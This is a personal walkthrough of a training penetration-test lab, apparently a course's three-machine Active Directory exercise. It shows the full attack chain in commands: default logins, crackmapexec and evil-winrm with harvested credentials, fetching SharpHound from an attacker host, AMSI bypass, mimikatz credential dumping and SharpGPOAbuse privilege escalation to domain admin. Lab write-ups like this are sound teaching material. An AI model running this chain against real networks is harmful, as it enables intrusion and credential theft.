In the first Challenge Lab, you are tasked with performing a penetration test on SECURA's three-machine enterprise environment. This lab serves as a ramp-up before tackling the more complex Challenge Labs 1-3. You will exploit vulnerabilities in ManageEngine, pivot through internal services, and leverage insecure GPO permissions to escalate privileges and compromise the domain



Challenge0 - VM 1 OS Credentials: **192.168.135.97** - DC

Challenge0 - VM 2 OS Credentials: **192.168.135.96**

Challenge0 - VM 3 OS Credentials: **192.168.135.95**

```
Eric.Wallows / EricLikesRunning800
```

### nmap
`sudo nmap -sC -sV -oN nmap/vm3 192.168.152.95 -oN nmap/vm2 192.168.152.96 -oN nmap/vm1 192.168.152.97`


#### VM3 Results (web server)
Running vulns scan against VM3 

![[Pasted image 20250307191423.png]]
Web app at 8443. 

Also a ton of output 
```
8443/tcp  open  ssl/https-alt  AppManager
|_http-server-header: AppManager
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 
|     Set-Cookie: JSESSIONID_APM_44444=D421A95A6C5BDF005F419F093760749B; Path=/; Secure; HttpOnly
|     Content-Type: text/html;charset=UTF-8
|     Content-Length: 973
|     Date: Sat, 08 Mar 2025 00:13:38 GMT
|     Connection: close
|     Server: AppManager
|     <!DOCTYPE html>
|     <meta http-equiv="X-UA-Compatible" content="IE=edge">
|     <html>
|     <head>
|     <title>Applications Manager</title>
|     <link REL="SHORTCUT ICON" HREF="/favicon.ico">
|     <!-- Includes commonstyle CSS and dynamic style sheet bases on user selection -->
|     <link href="/images/commonstyle.css?rev=14440" rel="stylesheet" type="text/css">
|     <link href="/images/newUI/newCommonstyle.css?rev=14260" rel="stylesheet" type="text/css">
|     <link href="/images/Grey/style.css?rev=14030" rel="stylesheet" type="text/css">
|     <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
|     </head>
|     <body bgcolor="#FFFFFF" leftmarg
|   GetRequest: 
|     HTTP/1.1 200 
|     Set-Cookie: JSESSIONID_APM_44444=38C12610133B7D859C5B13927706B1A8; Path=/; Secure; HttpOnly
|     Accept-Ranges: bytes
|     ETag: W/"261-1591621693000"
|     Last-Modified: Mon, 08 Jun 2020 13:08:13 GMT
|     Content-Type: text/html
|     Content-Length: 261
|     Date: Sat, 08 Mar 2025 00:13:38 GMT
|     Connection: close
|     Server: AppManager
|     <!-- $Id$ -->
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
|     <html>
|     <head>
|     <!-- This comment is for Instant Gratification to work applications.do -->
|     <script>
|     window.open("/webclient/common/jsp/home.jsp", "_top");
|     </script>
|     </head>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 403 
|     Set-Cookie: JSESSIONID_APM_44444=9691BFEC0FCA30C226F9F1C26AB24EA0; Path=/; Secure; HttpOnly
|     Cache-Control: private
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=UTF-8
|     Content-Length: 1810
|     Date: Sat, 08 Mar 2025 00:13:38 GMT
|     Connection: close
|     Server: AppManager
|     <meta http-equiv="X-UA-Compatible" content="IE=edge">
|     <meta http-equiv="Content-Type" content="UTF-8">
|     <!--$Id$-->
|     <html>
|     <head>
|     <title>Applications Manager</title>
|     <link REL="SHORTCUT ICON" HREF="/favicon.ico">
|     </head>
|     <body style="background-color:#fff;">
|     <style type="text/css">
|     #container-error
|     border:1px solid #c1c1c1;
|     background: #fff; font:11px Arial, Helvetica, sans-serif; width:90%; margin:80px;
|     #header-error
|     background: #ededed; line-height:18px;
|     padding: 15px; color:#000; font-size:8px;
|     #header-error h1
|_    margin: 0; color:#000;
12000/tcp open  cce4x?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows


```

Viewing webpage
![[Pasted image 20250307192245.png]]
Given creds didn't work. Lockout after 5 tries. 
Build No:14710

Default creds to login: `admin:admin`
![[Pasted image 20250307193224.png]]

Admin page
![[Pasted image 20250307193454.png]]

![[Pasted image 20250307193650.png]]
- database at localhost:15432 (postgresql)
- java version 1.8.0_202-b08
- build # 14710

Looks like there's a file upload section.

and a help card. gonna try to upload a .jar reverse shell. tried several different java files and none of them worked. 

burpsuite is not working for some reason either. 

Enumerate smb using #crackmapexec 

![[Pasted image 20250308103802.png]]
This use is a local admin. Let's try to psexec. 

Psexec worked. 

![[Pasted image 20250308104342.png]]

Flag: 8e3039a71cbcc729848752c7fef354b2

PWNED **192.168.135.95** VM3. 

Enumerating this box. 

There is a powershell `dns.ps1` script 

![[Pasted image 20250308104705.png]]
- maybe another network `192.168.120.23`
- If IP is not `192.168.120.23` it changes it to `192.168.120.97`

Continuing enumeration

![[Pasted image 20250308111639.png]]
- DNS server `192.168.135.97`

Groups. No other interesting users on this box. 

![[Pasted image 20250308111808.png]]
### VM2 
`192.168.135.96`

![[Pasted image 20250308112436.png]]

### VM1 is definitely the DC. 
`**192.168.135.97**` how do we get there? 

Sharphound on VM3

`iwr -uri http://192.168.45.222/SharpHound.ps1 -OutFile SharpHound.ps1`

Bloodhound.py is better.

![[Pasted image 20250308132202.png]]

Data did load into bloodhound yay! Marked eric.wallows and secure.secura.yzx as owned.

Ran "Find Shortest Path to Domain Admins"


Maybe?

![[Pasted image 20250308133051.png]]

![[Pasted image 20250308133114.png]]
Gonna try this dcsync attack. This attack is not working. 

Ran #mimikats `sekurlsa::logonpasswords`

Got cleartext password for VM2 

![[Pasted image 20250308135553.png]]
`apache:New2Era4.!` domain `era.secura.local`


![[Pasted image 20250308135959.png]]
Fail smb enum. Trying winrm. 

Nope just had to be more specific. 

`crackmapexec smb 192.168.135.96 -u apache -p 'New2Era4.!' -d era.secura.yzx --shares`

![[Pasted image 20250308141725.png]]

On winrm, we show Pwn3d!
![[Pasted image 20250308141817.png]]

Connect with evilwinrm.

`evil-winrm -i 192.168.135.96 -u apache -p 'New2Era4.!'`

Got shell.
![[Pasted image 20250308142003.png]]

Users
![[Pasted image 20250308142114.png]]

![[Pasted image 20250308142405.png]]

`net user apache`

![[Pasted image 20250308142442.png]]
`ipconfig /all`

![[Pasted image 20250308142850.png]]

Need to priv esc. 

Interesting services: 
**Possible** DLL hijacking 🙄
![[Pasted image 20250308145212.png]]
![[Pasted image 20250308145314.png]]

Interesting folders 
C:\windows\tasks
C:\windows\system32\tasks

Listening ports:
![[Pasted image 20250308145631.png]]
Permissions 

![[Pasted image 20250308150136.png]]

Is this normal? C:\xampp directory 

![[Pasted image 20250308150817.png]]

I think I found some creds..

![[Pasted image 20250308151347.png]]
`administrator:Almost4There8.?`

Fuck yeah.

![[Pasted image 20250308151717.png]]

psexec to box.

![[Pasted image 20250308151958.png]]
Stop running dir lol. 

Also another user `charlotte:Game2On4.!`

Owned vm 2. 
03dd623837e4142ddf9a4b2fc335ce25

Maybe re-run bloodhound.py?

### DC time

Enumerating this version Windows Server 2016 Standard 14393 - nothing immediately interesting 

Using creds found on previous box to list smb shares

`crackmapexec smb 192.168.135.97 -u charlotte -p 'Game2On4.!' -d secura.yzx --shares`

![[Pasted image 20250309111621.png]]
May want to read some of these shares, but first going to see if charlotte has winrm access. 

She does. :) 

![[Pasted image 20250309111738.png]]

And have a shell on the box. 

`evil-winrm -i 192.168.135.97 -u charlotte -p 'Game2On4.!'`

We have SeImpersonatePrivilege

![[Pasted image 20250309112038.png]]
![[Pasted image 20250309112133.png]]
my groups 
![[Pasted image 20250309112151.png]]
This `SharpGPOAbuse.exe` is already in charlotte's documents..

![[Pasted image 20250309112325.png]]

Want to enumerate using PowerView. 

![[Pasted image 20250309113231.png]]
Check permissions charlotte has over this policy

`Get-GPPermission -Guid 31b2f340-016d-11d2-945f-00c04fb984f9 -TargetType User -TargetName charlotte`

We do have useful permissions over the policy 

![[Pasted image 20250309113517.png]]

Now execute `SharpGPOAbuse.exe` to add current user to local admin group.

```
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount charlotte --GPOName "Default Domain Policy"
```

![[Pasted image 20250309113759.png]]

Now, force update the policy with 

```
gpupdate /force
```

![[Pasted image 20250309113943.png]]

Verify we're an admin

```
net localgroup administrators
```

![[Pasted image 20250309114036.png]]

Added user as owned in Bloodhound but graph still kind of confusing. Maybe retry mimikatz DCSync attack?

transfer mimikatz to target. 

Need to Use mimikatz.ps1 in `~/Tools/AD-Enum/Powersploit/Exfiltration/`

`*Evil-WinRM* PS C:\Users\TEMP\Documents> Bypass-4MSI`

`*Evil-WinRM* PS C:\Users\TEMP\Documents> . .\Invoke-Mimikatz.ps1`

`C:\Users\TEMP\Documents> Invoke-Mimikatz`

![[Pasted image 20250309115746.png]]
Got NTLM for DC01 

Username: DC01 NTLM hash: 8b3b59f1f1ea316e968784411bd2c07f

I may need to crack this hash to login. How tf do i get NT/Authority from hereeee

I was being dumb. Just had to psexec

![[Pasted image 20250309143907.png]]
![[Pasted image 20250309144006.png]]

done.
